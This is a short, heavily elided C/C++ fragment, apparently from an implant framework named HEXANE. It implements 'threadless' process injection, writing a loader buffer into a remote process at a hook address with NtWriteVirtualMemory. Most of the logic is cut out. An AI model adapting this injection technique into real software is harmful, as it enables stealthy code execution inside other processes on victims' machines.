...
// anything using HEXANE needs to have $start + linker.ld
    ...
    namespace Threadless {
        DLL_EXPORT VOID Threadless(HMODULE Base) {
            ...
            if (
                ...
                !NT_SUCCESS(Ctx->Nt.NtWriteVirtualMemory(Proc, C_PTR(pHook), Threadless.Loader.Buffer, Threadless.Loader.Length, &Write)) || Write != Threadless.Loader.Length) {
                return;
            }
